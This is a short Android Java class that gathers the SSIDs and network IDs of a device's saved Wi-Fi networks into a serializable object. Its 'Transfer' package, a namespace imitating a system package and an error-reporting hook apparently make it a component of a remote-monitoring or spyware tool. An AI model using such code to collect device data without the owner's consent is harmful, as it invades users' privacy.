package Transfer;

import android.content.Context;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

public class ConfiguredWifi implements Serializable {

  public List<Integer> NETWORKID;
  public List<String> SSID;

  public ConfiguredWifi() {
    SSID = new ArrayList();
    NETWORKID = new ArrayList();

    try {
      for (WifiConfiguration wifiConfiguration : ((WifiManager) MyService.context.getSystemService(
          Context.WIFI_SERVICE)).getConfiguredNetworks()) {
        SSID.add(wifiConfiguration.SSID);
        NETWORKID.add(wifiConfiguration.networkId);
      }
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
